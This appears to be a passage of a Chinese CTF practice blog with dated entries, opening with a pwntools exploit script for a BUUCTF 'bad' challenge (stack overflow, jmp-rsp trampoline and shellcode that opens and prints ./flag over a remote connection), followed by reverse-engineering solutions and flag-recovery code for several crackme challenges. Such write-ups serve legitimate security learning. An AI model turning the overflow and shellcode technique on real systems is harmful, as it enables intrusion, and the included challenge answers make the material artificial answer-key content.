+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#cn = process("./bad")</span></span><br><span class="line">cn = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29269</span>)</span><br><span class="line">elf = ELF(<span class="string">"bad"</span>)</span><br><span class="line">jmprsp = <span class="number">0x400a01</span></span><br><span class="line"></span><br><span class="line">payload1 = shellcraft.open(<span class="string">"./flag"</span>)</span><br><span class="line">payload1 += shellcraft.read(<span class="number">3</span>, <span class="number">0x123000</span>, <span class="number">0x50</span>)</span><br><span class="line">payload1 += shellcraft.write(<span class="number">1</span>, <span class="number">0x123000</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print payload1</span></span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.read(<span class="number">0</span>, <span class="number">0x123000</span>, <span class="number">0x90</span>)) + asm(<span class="string">"mov rax,0x123000;call rax"</span>)</span><br><span class="line">payload2 += <span class="string">'a'</span>*(<span class="number">0x28</span> - len(payload2)) + p64(jmprsp)</span><br><span class="line">payload2 += <span class="string">'\x4c\x8d\x4c\x24\xd0\x41\xff\xe1'</span><span class="comment">#lea r9,[rsp-0x30;jmp r9]</span></span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">raw_input()</span><br><span class="line">cn.send(payload2)</span><br><span class="line">raw_input()</span><br><span class="line">cn.sendline(asm(payload1))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="2020-5-10"><a href="#2020-5-10" class="headerlink" title="2020-5-10"></a>2020-5-10</h1><h2 id="FlareOn2-very-success"><a href="#FlareOn2-very-success" class="headerlink" title="[FlareOn2]very_success"></a>[FlareOn2]very_success</h2><p>ida加载的时候提示错误<br><img src="https://md.vidar.club/uploads/upload_aa845c55b12526a7365365054910e79d.png" alt=""><br>程序的最开头有个pop eax，把它nop掉就能修复堆栈平衡了<br>程序只有2个函数<br>大致流程</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    int16 v4 = <span class="number">0</span>, v11;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">37</span>;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">455</span>;</span><br><span class="line">    <span class="keyword">byte</span> *v7;</span><br><span class="line">    <span class="keyword">while</span>(len &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v11 = rol(<span class="number">1</span>, v4 &amp; <span class="number">3</span>) + <span class="number">1</span> + (num ^ *input);</span><br><span class="line">        v4 += v11;</span><br><span class="line">        <span class="keyword">if</span>(v11 != *v7)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        input++;</span><br><span class="line">        v7--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解密好像不是很难，就是一开始被绕晕了<br>exp</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ida.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">int16 <span class="title">rol</span><span class="params">(<span class="keyword">int</span> a, int16 b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt;&lt; (b &amp; <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    int16 v4 = <span class="number">0</span>;</span><br><span class="line">    int16 num = <span class="number">455</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v7[<span class="number">37</span>] = &#123;<span class="number">0xa8</span>, <span class="number">0x9a</span>, <span class="number">0x90</span>, <span class="number">0xb3</span>, <span class="number">0xb6</span>, <span class="number">0xbc</span>, <span class="number">0xb4</span>, <span class="number">0xab</span>, <span class="number">0x9d</span>, <span class="number">0xae</span>, <span class="number">0xf9</span>, <span class="number">0xb8</span>, <span class="number">0x9d</span>, <span class="number">0xb8</span>, <span class="number">0xaf</span>, <span class="number">0xba</span>, <span class="number">0xa5</span>, <span class="number">0xa5</span>, <span class="number">0xba</span>, <span class="number">0x9a</span>, <span class="number">0xbc</span>, <span class="number">0xb0</span>, <span class="number">0xa7</span>, <span class="number">0xc0</span>, <span class="number">0x8a</span>, <span class="number">0xaa</span>, <span class="number">0xae</span>, <span class="number">0xaf</span>, <span class="number">0xba</span>, <span class="number">0xa4</span>, <span class="number">0xec</span>, <span class="number">0xaa</span>, <span class="number">0xae</span>, <span class="number">0xeb</span>, <span class="number">0xad</span>, <span class="number">0xaa</span>, <span class="number">0xaf</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">37</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">char</span> input = (v7[i] - rol(<span class="number">1</span>, v4 &amp; <span class="number">3</span>) - <span class="number">1</span>) ^ num;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, input);</span><br><span class="line">       v4 += v7[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="singal"><a href="#singal" class="headerlink" title="singal"></a>singal</h2><p>第一次做VM<br>分析出opcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">10  read()</span><br><span class="line">4 10h 8 3 5 1      res[v7++] &#x3D; (i[v9++] ^ 0x10) - 5</span><br><span class="line">4 20h 8 5 3 1      res[v7++] &#x3D; (i[v9++] ^ 0x20) * 3</span><br><span class="line">3 2 8 11 1         res[v7++] &#x3D; i[v9++] - 2 - 1</span><br><span class="line">12 8 4 4 1         res[v7++] &#x3D; (i[v9++] + 1) ^ 4</span><br><span class="line">5 3 8 3 21h 1      res[v7++] &#x3D; (i[v9++] * 3) - 0x21</span><br><span class="line">11 8 11 1          res[v7++] &#x3D; i[v9++] - 1 - 1</span><br><span class="line">4 9 8 3 20h 1      res[v7++] &#x3D; (i[v9++] ^ 9) - 0x20</span><br><span class="line">2 51h 8 4 24h 1    res[v7++] &#x3D; (i[v9++] + 0x51) ^ 0x24</span><br><span class="line">12 8 11 1          res[v7++] &#x3D; i[v9++] + 1 - 1</span><br><span class="line">5 2 8 2 25h 1      res[v7++] &#x3D; i[v9++] * 2 + 0x25</span><br><span class="line">2 36h 8 4 41h 1    res[v7++] &#x3D; (i[v9++] + 0x36) ^ 0x41</span><br><span class="line">2 20h 8 5 1 1      res[v7++] &#x3D; (i[v9++] + 0x20) * 1</span><br><span class="line">5 3 8 2 25h 1      res[v7++] &#x3D; i[v9++] * 3 + 0x25</span><br><span class="line">4 9 8 3 20h 1      res[v7++] &#x3D; (i[v9++] ^ 9) - 0x20</span><br><span class="line">2 41h 8 12 1       res[v7++] &#x3D; i[v9++] + 0x41 + 1</span><br><span class="line"></span><br><span class="line">res[15] &#x3D; &#123;0x22, 0x3f, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31, 0xF1, 0x28, 0x84, 0xC1, 0x1e, 0x7a&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> res[<span class="number">15</span>] = &#123;<span class="number">0x22</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0xA7</span>, <span class="number">0x31</span>, <span class="number">0xF1</span>, <span class="number">0x28</span>, <span class="number">0x84</span>, <span class="number">0xC1</span>, <span class="number">0x1e</span>, <span class="number">0x7a</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i ^ <span class="number">0x10</span>) - <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">0</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i ^ <span class="number">0x20</span>) * <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">1</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i - <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i + <span class="number">1</span>) ^ <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">3</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i * <span class="number">3</span>) - <span class="number">0x21</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">4</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i - <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">5</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i ^ <span class="number">9</span>) - <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">6</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i + <span class="number">0x51</span>) ^ <span class="number">0x24</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">7</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">8</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i * <span class="number">2</span> + <span class="number">0x25</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">9</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i + <span class="number">0x36</span>) ^ <span class="number">0x41</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">10</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i + <span class="number">0x20</span>) * <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">11</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i * <span class="number">3</span> + <span class="number">0x25</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">12</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = (i ^ <span class="number">9</span>) - <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">13</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s = i + <span class="number">0x41</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(s == res[<span class="number">14</span>])</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>757515121f3d478</p>
+</blockquote>
+<h2 id="Jocker"><a href="#Jocker" class="headerlink" title="Jocker"></a>Jocker</h2><p>这题一开始ida没法解析，但从汇编里可以看出大致流程<br><img src="https://md.vidar.club/uploads/upload_0ef81ba84898aab1496dbaaacdc77954.png" alt=""><br>先输入，再比较字符串长度是否是24个字节<br>然后调用wrong和omg函数，这两个函数是可以f5的<br>从这两个函数里可以的到输入的字符串应该是<code>flag{fak3_alw35_sp_me!!}</code><br>但这是假的flag<br><img src="https://md.vidar.club/uploads/upload_49f88f3c801f302e2948e60b29f68c78.png" alt=""><br>这里有一个循环，就是把encrypt函数开始的内容都xor 0x41，长度正好到finally那里。<br>这个程序是边解密边执行的，所以ida一开始没法解析。可以先在循环后面下断，在把经过xor的数据patch到原程序上就可以f5了<br><img src="https://md.vidar.club/uploads/upload_4d0180c2312510e2959709547c2fe9cf.png" alt=""><br><img src="https://md.vidar.club/uploads/upload_4bd6161ee59756472675ff231c44ee5a.png" alt=""></p>
+<h1 id="2020-5-11"><a href="#2020-5-11" class="headerlink" title="2020-5-11"></a>2020-5-11</h1><p>咕咕。。。。。</p>
+<h1 id="2020-5-12"><a href="#2020-5-12" class="headerlink" title="2020-5-12"></a>2020-5-12</h1><h2 id="What’s-Virtialization"><a href="#What’s-Virtialization" class="headerlink" title="What’s Virtialization"></a>What’s Virtialization</h2><p>不知道它是怎么判断的,好多都符合条件<br><img src="https://md.vidar.club/uploads/upload_603992124217fbbc9519e0957734354b.png" alt=""></p>
+<p><img src="https://md.vidar.club/uploads/upload_ecaf68476885e4315a2b31bfa6474edc.png" alt=""><br><img src="https://md.vidar.club/uploads/upload_c5c7c07db0b9aff348b0168f4e69bd11.png" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_401180</span><span class="params">(a1, a2)</span>:</span><span class="comment">#经过化简相当于xor</span></span><br><span class="line">    v2 = ~a1 &amp; ~a2</span><br><span class="line">    v3 = ~(~a1 &amp; ~a1) &amp; ~(~a2 &amp; ~a2)</span><br><span class="line">    <span class="keyword">return</span> ~v3 &amp; ~v2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_401030</span><span class="params">(a1, a2)</span>:</span><span class="comment">#经过化简相当于and</span></span><br><span class="line">    v2 = ~a2 &amp; ~a2</span><br><span class="line">    v3 = ~a1 &amp; ~a1</span><br><span class="line">    <span class="keyword">return</span> ~v3 &amp; ~v2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_401120</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    v2 = ~a2 &amp; ~a1</span><br><span class="line">    v3 = ~a2 &amp; ~a1</span><br><span class="line">    <span class="keyword">return</span> ~v2 &amp; ~v3</span><br><span class="line"></span><br><span class="line">byte_406024 = [<span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x38</span>]</span><br><span class="line">byte_406050 = [<span class="number">0x7d</span>, <span class="number">0x5b</span>, <span class="number">0x5e</span>, <span class="number">0x5d</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>]</span><br><span class="line">byte_406058 = <span class="string">'dtKcXxDmYgoNY'</span></span><br><span class="line">byte_406068 = <span class="string">'@D]pTYHp@Yw^O'</span></span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    flag = byte_406024[v7]^byte_406050[i]</span><br><span class="line">    v7=(v7+<span class="number">1</span>)%<span class="number">6</span></span><br><span class="line">    print(chr(flag),end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    flag = byte_406024[v7]^ord(byte_406058[i])</span><br><span class="line">    v7 = (v7+<span class="number">1</span>)%<span class="number">6</span></span><br><span class="line">    print(chr(flag),end=<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    flag = byte_406024[v7]^ord(byte_406068[i])</span><br><span class="line">    v7 = (v7+<span class="number">1</span>)%<span class="number">6</span></span><br><span class="line">    print(chr(flag),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<p>感觉这道题的判断有问题啊</p>
+<h1 id="2020-5-13"><a href="#2020-5-13" class="headerlink" title="2020-5-13"></a>2020-5-13</h1><p>咕咕咕。。</p>
+<h1 id="2020-5-14"><a href="#2020-5-14" class="headerlink" title="2020-5-14"></a>2020-5-14</h1><h2 id="De1CTF2019-cplusplus"><a href="#De1CTF2019-cplusplus" class="headerlink" title="[De1CTF2019]cplusplus"></a>[De1CTF2019]cplusplus</h2><p>C++逆向<br>一脸懵逼，好像用到了C艹的特性</p>
+<h1 id="2020-5-15"><a href="#2020-5-15" class="headerlink" title="2020-5-15"></a>2020-5-15</h1><p>上一题毫无进展<br>。。。。<br>太菜了，鸽了</p>
+<h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>新生赛的题</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v15[<span class="number">16</span>] = &#123;<span class="number">81</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">51</span>, <span class="number">115</span>, <span class="number">106</span>, <span class="number">95</span>, <span class="number">108</span>, <span class="number">122</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">106</span>, <span class="number">119</span>, <span class="number">64</span>, <span class="number">108</span>&#125;;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ACTF&#123;"</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v15[i] &lt;= <span class="number">90</span> &amp;&amp; v15[i] &gt;= <span class="number">65</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> j = <span class="number">65</span>; j &lt;= <span class="number">90</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((j - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span> == v15[i])</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (v15[i] &lt;= <span class="number">122</span> &amp;&amp; v15[i] &gt;= <span class="number">97</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((j - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span> == v15[i])</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; v15[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#125;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
